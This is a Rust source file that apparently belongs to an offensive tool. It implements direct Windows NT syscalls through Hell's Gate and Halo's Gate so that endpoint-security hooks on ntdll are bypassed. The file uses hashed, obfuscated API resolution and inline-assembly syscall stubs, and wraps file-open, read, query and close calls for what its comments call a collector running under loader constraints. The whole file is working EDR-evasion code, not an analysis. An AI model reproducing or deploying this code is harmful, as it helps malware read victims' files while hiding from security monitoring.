//! Direct NT syscalls, x64 only (Hell's/Halo's Gate).
//!
//! ntdll stubs are located via hash-based export resolution (resolve.rs),
//! the syscall number (SSN) is lifted out of the stub, and the `syscall`
//! instruction is issued from our own asm — user-mode inline hooks on the
//! ntdll stub are never executed. If the target stub itself is hooked
//! (prologue is not `4C 8B D1 B8`), neighboring stubs are scanned (32-byte
//! stride, up to 32 each way) for a clean one and the SSN is inferred by
//! offset arithmetic.

use std::ffi::c_void;
use std::sync::atomic::{compiler_fence, Ordering};

use crate::resolve::resolve;

pub type NtStatus = i32;

pub const STATUS_END_OF_FILE: NtStatus = 0xC000_0011u32 as i32;
pub const STATUS_SHARING_VIOLATION: NtStatus = 0xC000_0043u32 as i32;
pub const STATUS_OBJECT_NAME_INVALID: NtStatus = 0xC000_0033u32 as i32;
pub const STATUS_NO_MEMORY: NtStatus = 0xC000_0017u32 as i32;

// DesiredAccess
pub const FILE_READ_DATA: u32 = 0x0001;
pub const FILE_READ_ATTRIBUTES: u32 = 0x0080;
pub const SYNCHRONOUS: u32 = 0x0010_0000;
// ShareAccess
pub const FILE_SHARE_READ: u32 = 0x0001;
pub const FILE_SHARE_WRITE: u32 = 0x0002;
pub const FILE_SHARE_DELETE: u32 = 0x0004;
// CreateDisposition
pub const FILE_OPEN: u32 = 1;
// CreateOptions
pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0020;
pub const FILE_NON_DIRECTORY_FILE: u32 = 0x0040;
// OBJECT_ATTRIBUTES.Attributes
pub const OBJ_CASE_INSENSITIVE: u32 = 0x0040;
// FILE_INFORMATION_CLASS
pub const FILE_STANDARD_INFORMATION: u32 = 5;

#[repr(C)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *const u16,
}

impl UnicodeString {
    /// `units` must not include the NUL terminator.
    pub fn new(units: &[u16]) -> Self {
        let bytes = (units.len() * 2) as u16;
        UnicodeString {
            length: bytes,
            maximum_length: bytes + 2,
            buffer: units.as_ptr(),
        }
    }
}

#[repr(C)]
pub struct ObjectAttributes {
    pub length: u32,
    pub root_directory: usize,
    pub object_name: *const UnicodeString,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

impl ObjectAttributes {
    pub fn new(object_name: *const UnicodeString) -> Self {
        ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

#[repr(C)]
#[derive(Default)]
pub struct IoStatusBlock {
    pub status: NtStatus,
    pub _pad: u32,
    pub information: usize,
}

#[repr(C)]
#[derive(Default)]
pub struct FileStandardInformation {
    pub allocation_size: i64,
    pub end_of_file: i64,
    pub number_of_links: u32,
    pub delete_pending: u8,
    pub directory: u8,
}

// ---------------------------------------------------------------------------
// SSN resolution (Hell's Gate + Halo's Gate fallback)
// ---------------------------------------------------------------------------

/// Clean x64 syscall stub prologue: `mov r10, rcx; mov eax, <ssn32>` with the
/// high SSN bytes zero (SSNs are < 0x1000 on every released Windows).
unsafe fn clean_stub_ssn(p: *const u8) -> Option<u32> {
    if *p == 0x4c
        && *p.add(1) == 0x8b
        && *p.add(2) == 0xd1
        && *p.add(3) == 0xb8
        && *p.add(6) == 0
        && *p.add(7) == 0
    {
        Some(u16::from_le_bytes([*p.add(4), *p.add(5)]) as u32)
    } else {
        None
    }
}

/// Extract the SSN for an ntdll export by name hash. Hell's Gate first;
/// if the stub is hooked, Halo's Gate over +-32 neighboring stubs (ntdll
/// syscall stubs are 32 bytes apart and sequential in SSN).
unsafe fn extract_ssn(name_hash: u32) -> Option<u32> {
    let stub = resolve(&crate::obf!("ntdll.dll"), name_hash);
    if stub == 0 {
        return None;
    }
    let p = stub as *const u8;
    if let Some(ssn) = clean_stub_ssn(p) {
        return Some(ssn);
    }
    for i in 1..=32isize {
        // Higher addresses hold higher SSNs.
        if let Some(ssn) = clean_stub_ssn(p.offset(i * 32)) {
            return ssn.checked_sub(i as u32);
        }
        if let Some(ssn) = clean_stub_ssn(p.offset(-i * 32)) {
            return Some(ssn + i as u32);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// SSN table (resolved once; C-style globals only per the loader constraints —
// the collector runs on a single worker thread and init writes are identical)
// ---------------------------------------------------------------------------

#[derive(Clone, Copy)]
pub struct Nt {
    create_file: u32,
    read_file: u32,
    query_information_file: u32,
    close: u32,
}

static mut NT: Nt = Nt {
    create_file: 0,
    read_file: 0,
    query_information_file: 0,
    close: 0,
};
/// 0 = untried, 1 = ready, 2 = resolution failed.
static mut NT_STATE: u8 = 0;

/// Resolved SSN table, or None if any needed syscall could not be resolved
/// (caller falls back to the Win32/std path).
pub fn nt() -> Option<Nt> {
    unsafe {
        if NT_STATE == 0 {
            NT = Nt {
                create_file: extract_ssn(crate::api!("NtCreateFile")).unwrap_or(0),
                read_file: extract_ssn(crate::api!("NtReadFile")).unwrap_or(0),
                query_information_file: extract_ssn(crate::api!("NtQueryInformationFile"))
                    .unwrap_or(0),
                close: extract_ssn(crate::api!("NtClose")).unwrap_or(0),
            };
            NT_STATE = if NT.create_file != 0
                && NT.read_file != 0
                && NT.query_information_file != 0
                && NT.close != 0
            {
                1
            } else {
                2
            };
        }
        if NT_STATE == 1 {
            Some(NT)
        } else {
            None
        }
    }
}

// ---------------------------------------------------------------------------
// Syscall stubs (Windows x64 syscall convention: rcx -> r10, args 5+ on the
// stack at [rsp+0x28..], result in rax; syscall clobbers rcx and r11)
// ---------------------------------------------------------------------------

#[inline(never)]
unsafe fn syscall1(ssn: u32, a1: usize) -> i32 {
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        inlateout("rcx") a1 => _,
        out("r11") _,
        out("r10") _,
        options(nostack),
    );
    ret
}

#[inline(never)]
unsafe fn syscall5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x30",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x30",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
unsafe fn syscall9(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
) -> i32 {
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x50",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x50",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn syscall11(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov qword ptr [rsp+0x50], {a10}",
        "mov qword ptr [rsp+0x58], {a11}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x60",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

// ---------------------------------------------------------------------------
// Typed NT wrappers
// ---------------------------------------------------------------------------

impl Nt {
    #[allow(clippy::too_many_arguments)]
    pub unsafe fn create_file(
        &self,
        handle: *mut usize,
        desired_access: u32,
        object_attributes: *const ObjectAttributes,
        io_status: *mut IoStatusBlock,
        allocation_size: *const i64,
        file_attributes: u32,
        share_access: u32,
        create_disposition: u32,
        create_options: u32,
        ea_buffer: *mut c_void,
        ea_length: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall11(
            self.create_file,
            handle as usize,
            desired_access as usize,
            object_attributes as usize,
            io_status as usize,
            allocation_size as usize,
            file_attributes as usize,
            share_access as usize,
            create_disposition as usize,
            create_options as usize,
            ea_buffer as usize,
            ea_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    #[allow(clippy::too_many_arguments)]
    pub unsafe fn read_file(
        &self,
        handle: usize,
        event: usize,
        apc_routine: usize,
        apc_context: usize,
        io_status: *mut IoStatusBlock,
        buffer: *mut c_void,
        length: u32,
        byte_offset: *const i64,
        key: *const u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall9(
            self.read_file,
            handle,
            event,
            apc_routine,
            apc_context,
            io_status as usize,
            buffer as usize,
            length as usize,
            byte_offset as usize,
            key as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn query_information_file(
        &self,
        handle: usize,
        io_status: *mut IoStatusBlock,
        info: *mut c_void,
        length: u32,
        class: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.query_information_file,
            handle,
            io_status as usize,
            info as usize,
            length as usize,
            class as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn close(&self, handle: usize) -> NtStatus {
        syscall1(self.close, handle)
    }
}
